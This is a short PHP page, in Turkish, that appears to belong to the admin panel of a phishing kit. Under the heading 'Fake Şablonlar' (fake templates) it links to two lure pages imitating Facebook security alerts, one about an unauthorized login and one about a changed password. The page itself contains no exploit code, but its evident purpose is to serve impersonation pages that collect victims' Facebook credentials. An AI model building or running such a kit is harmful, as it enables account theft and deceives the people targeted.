<?php 
require_once 'header.php';
require_once '../config.php';

?>
      <div class="content">
        <div class="container-fluid">
          <div class="card">
            <div class="card-header card-header-primary">
              <h4 class="card-title">Fake Şablonlar</h4>
              <p class="card-category">Şablon Linkleri</p>
            </div>
            <div class="card-body">
              <div id="typography">
                <div class="card-title">
                  <h2>Yazıya Tıkla Şablon Açılsın</h2>
                </div>
                <div class="row">
           <div class="alert alert-info alert-with-icon" data-notify="container">
                    <i class="material-icons" data-notify="icon">add_alert</i>
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                      <i class="material-icons">close</i>
                    </button>
                    <span data-notify="message"><a href="sablon1.html">Facebook İzinsiz Giriş</a></span>
                  </div>
           <br /> <br />
            <div class="alert alert-info alert-with-icon" data-notify="container">
                    <i class="material-icons" data-notify="icon">add_alert</i>
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                      <i class="material-icons">close</i>
                    </button>
                     <span data-notify="message"><a href="sablon2.html">Facebook Şifreniz Değiştirildi</a></span>
                  </div>
                    
           
              
                 
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
          <?php 
require_once 'footer.php';
?>